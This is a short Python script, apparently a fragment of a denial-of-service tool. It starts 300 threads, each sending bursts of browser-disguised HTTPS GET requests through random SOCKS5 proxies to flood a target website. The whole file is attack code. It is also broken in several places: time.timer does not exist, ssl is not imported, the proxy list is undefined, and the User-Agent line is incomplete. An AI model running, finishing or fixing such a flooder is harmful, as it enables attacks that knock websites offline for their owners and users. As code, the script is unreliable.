from os import system, name
import os, threading, requests, sys, datetime, time, socket, socks, random
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
#add threads function here
def atk(url, timer, packet):
   for i in range(int(300)):
       threading.Thread(target=attk, args=(url, timer)).start()
       
def attk(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    samayam = time.time() + int(timer)
    req = "GET / HTTP/1.1\r\nHost:  " + urlparse(url).netloc + "\r\n"
    req += "cache-Control: no-cache \r\n"
    req += "User-Agent: " #add user agents here
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.timer() < samayam:
        try: 
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
